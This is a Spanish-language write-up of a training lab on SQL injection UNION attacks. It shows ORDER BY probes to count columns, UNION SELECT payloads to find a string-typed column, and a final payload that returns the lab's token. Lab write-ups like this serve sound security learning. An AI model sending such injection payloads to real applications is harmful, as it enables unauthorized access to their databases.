---
title: "Lab: SQL injection UNION attack, finding a column containing text"
date: 2025-11-16
category: "SQL Injection"
order: 5
tags: ["web-security-academy", "sql-injection", "lab", "union"]
layout: layouts/writeup.njk
permalink: /writeups/sql-injection-lab-union-finding-text-column.html
---

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided.

---

## Paso 1 — Determinar el número de columnas

Se puede hacer con `UNION SELECT NULL, NULL, ...` o con `ORDER BY N`.

## Paso 2 — Determinar el tipo de dato de cada columna

```sql
SELECT a, b, c FROM table1 UNION SELECT 'a', NULL, NULL
```

- Si da error → esa columna no es de tipo string.
- Si no da error → esa columna sí acepta string.

---

## Pruebas realizadas

### Determinar el número de columnas con ORDER BY

```sql
'+ORDER+BY+1-- → No error
'+ORDER+BY+2-- → No error
'+ORDER+BY+3-- → No error
'+ORDER+BY+4-- → Error
```

Esto significa que hay **3 columnas** (la primera columna no se muestra visualmente en la página).

### Determinar el tipo de dato de cada columna

```sql
' UNION SELECT 'a', NULL, NULL-- → Error → columna 1 no es str
' UNION SELECT NULL, 'a', NULL-- → No error → columna 2 es str
' UNION SELECT NULL, NULL, 'a'-- → Error → columna 3 no es str
```

## Payload final ✅

Con la columna 2 confirmada como string, se usa para retornar el valor requerido por el lab (`'XPNbgd'` en este caso):

```sql
' UNION SELECT NULL, 'XPNbgd', NULL--
```

El valor aparece en la respuesta de la aplicación. Lab resuelto.
